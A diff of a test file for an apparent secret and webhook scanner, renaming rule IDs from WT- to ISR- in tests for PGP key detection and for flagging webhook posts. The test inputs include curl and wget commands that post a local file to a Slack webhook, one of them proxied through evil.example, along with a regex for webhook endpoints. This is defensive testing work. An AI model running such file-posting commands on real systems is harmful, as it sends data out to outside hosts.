@@ -9,8 +9,8 @@ Ed25519 or Ed448 key, two packets) got the "isn't a real key" note and the examp
 fit in those fields. Any body that may start an OpenPGP packet is now a key.
 C (7b chat_webhook): (1) an opening <pre>/<code> tag's quoted attribute could end the code region early; (2) a redirection in an
 accepted curl command shifted which word an option read; (3) JavaScript's `with` could change what the client name means. Each
-is now doubt, so a Slack or Discord webhook there is the critical WT-T005.
-D (7b WT-T018): the Office-webhook branch was unanchored, quadratic on a long word; it is anchored with (?<![\\w-]).
+is now doubt, so a Slack or Discord webhook there is the critical ISR-T005.
+D (7b ISR-T018): the Office-webhook branch was unanchored, quadratic on a long word; it is anchored with (?<![\\w-]).
 
 Tests marked "replay" fail on 006c719 at their assertion (its watchtower/, rules/ and MANIFEST.sha256, this file in place);
 "guard" ones pass there too. Every real-shaped key is generated when the test runs and never committed; fake ones say FAKE.
@@ -129,7 +129,7 @@ def framed():
 
 
 class PublicFraming(_Keys):
-    def test_public_framing_is_a_key(self):   # replay (006c719: WT-T011x, "isn't a real key")
+    def test_public_framing_is_a_key(self):   # replay (006c719: ISR-T011x, "isn't a real key")
         for name, raw in framed().items():
             with self.subTest(name):
                 self.assertEqual(wt.pgp_packets(raw), "public", name)   # the framing is read as before
@@ -137,7 +137,7 @@ class PublicFraming(_Keys):
                 block = pgp_armor(raw)
                 self.assertEqual(wt.secret_kind(block.split("\n")[0], tail=block[block.index("\n"):])[0], "real", name)
                 got = t011("Key:\n" + pem("", raw))
-                self.assertEqual([(f["rule"], f["severity"]) for f in got], [("WT-T011", "critical")], name)
+                self.assertEqual([(f["rule"], f["severity"]) for f in got], [("ISR-T011", "critical")], name)
                 self.assertFalse(NOTE in got[0]["fix"], f"noted as an example: {name}")
 
     def test_through_gitleaks_it_is_a_key_left_in_a_file(self):   # replay (006c719: "Keys that look like examples or checksums")
@@ -145,7 +145,7 @@ class PublicFraming(_Keys):
         p = self.put("projects/app/release.asc", block)
         self.leak(p, block.rstrip("\n"), rule="private-key")
         fs, _ = self.scan()
-        got = [f for f in self.keys(fs, p) if f["rule"] == "WT-S002"]
+        got = [f for f in self.keys(fs, p) if f["rule"] == "ISR-S002"]
         self.assertEqual(len(got), 1, got)
         self.assertNotIn(NOTE, got[0]["fix"])
         self.assertEqual(wt.plain(got[0])["title"], "Keys left in files")
@@ -153,7 +153,7 @@ class PublicFraming(_Keys):
     def test_a_fake_text_body_is_still_noted(self):   # guard: the example path, for a body that starts no key
         raw = fake_text_body(120)
         got = t011("Key:\n" + pem("", raw))
-        self.assertEqual([(f["rule"], f["severity"]) for f in got], [("WT-T011x", "critical")])
+        self.assertEqual([(f["rule"], f["severity"]) for f in got], [("ISR-T011x", "critical")])
         self.assertIn(NOTE, got[0]["fix"])
         block = pgp_armor(raw)
         self.assertEqual(wt.secret_kind(block.split("\n")[0], tail=block[block.index("\n"):])[0], "example")
@@ -165,21 +165,21 @@ def curl(cmd, lang="bash"):
 
 
 class WebhookDoubt(unittest.TestCase):
-    def test_c1_a_quoted_attribute_in_an_opening_tag(self):   # replay (006c719: WT-T018)
+    def test_c1_a_quoted_attribute_in_an_opening_tag(self):   # replay (006c719: ISR-T018)
         for tag in ('<pre title="</pre>">', "<code data-x='</code>'>", '<PRE class="</PRE>">'):
             with self.subTest(tag):
                 close = "</" + tag[1:tag.index(" ")] + ">"
                 text = HEAD + tag + "\nnotes\n\nalias curl=relay\n" + close + "\n\n```bash\ncurl -d @d.json '" + SLACK + "'\n```\n"
-                self.assertEqual(rules_of(text), {"WT-T005"}, tag)
+                self.assertEqual(rules_of(text), {"ISR-T005"}, tag)
 
-    def test_c1_any_attribute_is_doubt(self):   # replay (006c719: WT-T018): the new false alarm, pinned
+    def test_c1_any_attribute_is_doubt(self):   # replay (006c719: ISR-T018): the new false alarm, pinned
         text = HEAD + '<pre class="notes">\nnotes\n</pre>\n\n```bash\ncurl -d @d.json \'' + SLACK + "'\n```\n"
-        self.assertEqual(rules_of(text), {"WT-T005"})
+        self.assertEqual(rules_of(text), {"ISR-T005"})
 
     def test_c1_a_bare_tag_stays(self):   # guard
         for tag, close in (("<pre>", "</pre>"), ("<code >", "</code>"), ("<PRE\n>", "</PRE>")):
             text = HEAD + tag + "\nnotes\n" + close + "\n\n```bash\ncurl -d @d.json '" + SLACK + "'\n```\n"
-            self.assertEqual(rules_of(text), {"WT-T018"}, tag)
+            self.assertEqual(rules_of(text), {"ISR-T018"}, tag)
 
     REDIRECTS = ("curl -H >o -d -xhttp://evil.example '" + SLACK + "'",   # the shell reads -H -d, then -x: a proxy
                  "curl -s -d @d.json '" + SLACK + "' > out.txt",
@@ -190,36 +190,36 @@ class WebhookDoubt(unittest.TestCase):
                  "curl -d @d.json 2>err.txt '" + SLACK + "'",
                  "wget -qO- --post-file=d.json '" + SLACK + "' >out")
 
-    def test_c2_any_redirection_in_the_command(self):   # replay (006c719: WT-T018)
+    def test_c2_any_redirection_in_the_command(self):   # replay (006c719: ISR-T018)
         for cmd in self.REDIRECTS:
             with self.subTest(cmd):
-                self.assertEqual(rules_of(curl(cmd)), {"WT-T005"}, cmd)
+                self.assertEqual(rules_of(curl(cmd)), {"ISR-T005"}, cmd)
 
     def test_c2_quoted_angle_brackets_stay(self):   # guard: a < or > in quotes or after # is no redirection
         for cmd in ("curl -H 'Accept: <x>' -d '{\"a\":\"b>c\"}' '" + SLACK + "'",
                     'curl -H "X-Note: a>b" -d @d.json \'' + SLACK + "'",
                     "curl -d @d.json '" + SLACK + "' # > not a redirection",
                     "curl -d @d.json '" + SLACK + "' && echo sent"):
-            self.assertEqual(rules_of(curl(cmd)), {"WT-T018"}, cmd)
+            self.assertEqual(rules_of(curl(cmd)), {"ISR-T018"}, cmd)
 
-    def test_c3_with_changes_the_client_name(self):   # replay (006c719: WT-T018)
+    def test_c3_with_changes_the_client_name(self):   # replay (006c719: ISR-T018)
         for lang, code in (("js", "with (relay)\naxios.post('" + SLACK + "', body)"),
                            ("js", "with (relay)\n  axios.post('" + SLACK + "', body)"),
                            ("python", "with relay:\n    requests.post('" + SLACK + "', json=payload)")):   # the false alarm, pinned
             with self.subTest(code):
-                self.assertEqual(rules_of(fenced(code, lang)), {"WT-T005"}, code)
+                self.assertEqual(rules_of(fenced(code, lang)), {"ISR-T005"}, code)
 
     def test_c3_with_inside_a_word_stays(self):   # guard: the word only (case-sensitive, whole word)
         for code in ("const ok = name.startsWith('x')\naxios.post('" + SLACK + "', body)",
                      "const withTeam = 1\naxios.post('" + SLACK + "', body)"):
-            self.assertEqual(rules_of(fenced(code, "js")), {"WT-T018"}, code)
+            self.assertEqual(rules_of(fenced(code, "js")), {"ISR-T018"}, code)
 
 
-# ---------------------------------------------------------------- D: WT-T018's Office branch
+# ---------------------------------------------------------------- D: ISR-T018's Office branch
 OLD_T018 = (r"(?i)(hooks\.slack\.com/(services|workflows|triggers)/|discord(app)?\.com/api/webhooks/|[\w-]+\.webhook\.office\.com/"
             r"|outlook\.office\.com/webhook/|chat\.googleapis\.com/v1/spaces/[^/\s]+/messages|api\.telegram\.org/bot)")
 CHILD_T018 = ("import sys, time\nsys.path.insert(0, {wt_dir!r})\nimport wt\n"
-              "rx = next(r['rx'] for r in wt.load_rules()['rules'] if r['id'] == 'WT-T018')\n"
+              "rx = next(r['rx'] for r in wt.load_rules()['rules'] if r['id'] == 'ISR-T018')\n"
               "for word in ('a' * 64000, 'a' * 128000, ('ab-' * 43000)[:128000]):\n"
               "    t = time.perf_counter()\n    list(rx.finditer(word))\n    print(time.perf_counter() - t)\n")
 
@@ -233,7 +233,7 @@ class OfficeWebhookPattern(unittest.TestCase):
 
     def test_every_t018_match_is_kept(self):   # guard: the anchored pattern matches what the old one did
         import re
-        new = next(r["rx"] for r in wt.load_rules()["rules"] if r["id"] == "WT-T018")
+        new = next(r["rx"] for r in wt.load_rules()["rules"] if r["id"] == "ISR-T018")
         old = re.compile(OLD_T018)
         for text in ("https://example.webhook.office.com/webhookb2/FAKE", "https://contoso.webhook.office.com/webhookb2/FAKE",
                      "https://outlook.office.com/webhook/FAKE", "https://a-b_c.webhook.office.com/webhookb2/FAKE",
